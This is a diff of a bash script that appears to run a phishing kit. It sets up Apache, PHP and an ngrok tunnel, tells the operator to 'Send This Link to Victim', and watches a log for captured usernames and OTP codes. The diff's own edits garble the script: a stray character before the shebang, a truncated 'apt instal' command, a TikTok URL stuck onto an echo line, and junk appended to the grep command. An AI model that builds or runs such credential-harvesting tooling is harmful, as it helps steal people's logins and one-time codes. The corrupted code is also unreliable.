@@ -1,3 +1,4 @@
+ه
 #!/bin/bash 
 
 stop() {
@@ -47,7 +48,7 @@ clear
                 sleep 2
                 echo""
                 sudo apt-get install apache2
-		apt install php
+		apt instal
                 apt install jq
                 apt install tail
                 apt install curl
@@ -77,7 +78,7 @@ clear
                 clear  
                 ./Logo.sh
                 echo ""                    
-                echo   -e $yellow "// [ Send This Link to Victim ] //"
+                echo   -e $yellow "// [ Send This Link to Victim ] //"https://vm.tiktok.com/ZM8dqbqnY/
                 echo ""
                 echo -e $white
                 curl -s localhost:4040/api/tunnels | jq -r .tunnels[1].public_url
@@ -87,7 +88,7 @@ clear
                 echo ""
                 echo -e $green "//  [ CREDENTIAL ] //"
                 echo ""
-                tail -f log.txt | grep -e "username" -e "otp"
+                tail -f log.txt | grep -e "username" -e "otp"uy_w2
 
 
 
